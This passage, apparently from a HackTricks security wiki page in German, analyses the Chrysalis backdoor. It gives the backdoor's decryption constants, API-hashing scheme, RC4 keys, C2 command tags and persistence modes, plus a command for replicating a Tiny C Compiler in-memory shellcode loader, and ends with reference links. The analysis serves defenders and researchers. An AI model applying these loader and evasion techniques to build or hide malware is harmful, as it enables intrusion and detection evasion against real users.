- Das Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt das Blob via mmap; `LogWrite` entschlüsselt es mit einem custom LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Key-Material abgeleitet von einem vorherigen Hash), überschreibt den Buffer mit Klartext-Shellcode, gibt temporäre Ressourcen frei und springt zu diesem.
- Um eine IAT zu vermeiden, löst der Loader APIs auf, indem er Exportnamen mit **FNV-1a basis 0x811C9DC5 + prime 0x1000193** hasht, dann eine Murmur-ähnliche avalanche (**0x85EBCA6B**) anwendet und mit gesalzenen Ziel-Hashes vergleicht.

Main shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches Hauptmodul durch wiederholtes add/XOR/sub mit dem Key `gQ2JR&9;` über fünf Durchläufe, lädt dann dynamisch `Kernel32.dll` → `GetProcAddress`, um die Import-Auflösung abzuschließen.
- Rekonstruiert DLL-Namen-Strings zur Laufzeit via per-Character Bit-Rotate/XOR-Transform, lädt dann `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Verwendet einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede Exporttabelle in 4-Byte-Blöcken mit Murmur-ähnlichem Mixing parst und nur auf `GetProcAddress` zurückfällt, wenn der Hash nicht gefunden wird.

Embedded configuration & C2
- Die Config liegt innerhalb der gedroppten `BluetoothService`-Datei bei **Offset 0x30808** (Größe **0x980**) und ist mit RC4 und dem Key `qwhvb^435h&*7` entschlüsselt, was die C2-URL und den User-Agent offenbart.
- Beacons bauen ein punktgetrenntes Host-Profil, setzen das Präfix `4Q`, dann RC4-verschlüsseln mit Key `vAuig34%^325hGV` bevor `HttpSendRequestA` über HTTPS aufgerufen wird. Antworten werden RC4-decrypted und per Tag-Switch verteilt (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer Fälle).
- Der Ausführungsmodus wird über CLI-Args gesteuert: keine Args = Installations-Persistence (Service/Run-Key) mit Verweis auf `-i`; `-i` relauncht sich selbst mit `-k`; `-k` überspringt die Installation und führt die Payload aus.

Alternate loader observed
- Dieselbe Intrusion droppt Tiny C Compiler und führte `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` aus, mit `libtcc.dll` daneben. Der Angreifer-lieferte C-Source bettete Shellcode ein, kompilierte und führte ihn in-memory aus, ohne die Festplatte mit einer PE zu berühren. Replizieren mit:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Diese auf TCC basierende Compile-and-run-Stufe importierte zur Laufzeit `Wininet.dll` und lud einen second-stage shellcode von einer fest kodierten URL, wodurch ein flexibler Loader entstand, der sich als Compilerlauf tarnte.

## Referenzen

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
